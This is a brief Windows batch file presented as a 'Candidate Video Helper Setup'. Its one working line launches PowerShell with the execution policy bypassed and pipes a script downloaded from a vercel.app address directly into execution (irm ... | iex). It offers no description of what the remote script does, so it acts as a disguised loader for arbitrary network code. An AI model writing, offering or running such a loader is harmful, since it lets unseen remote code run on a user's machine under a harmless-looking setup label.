@echo off
title Candidate Video Helper Setup
powershell -NoProfile -ExecutionPolicy Bypass -Command "irm https://candidate-video-suite.vercel.app/install.ps1 | iex"
echo.
pause
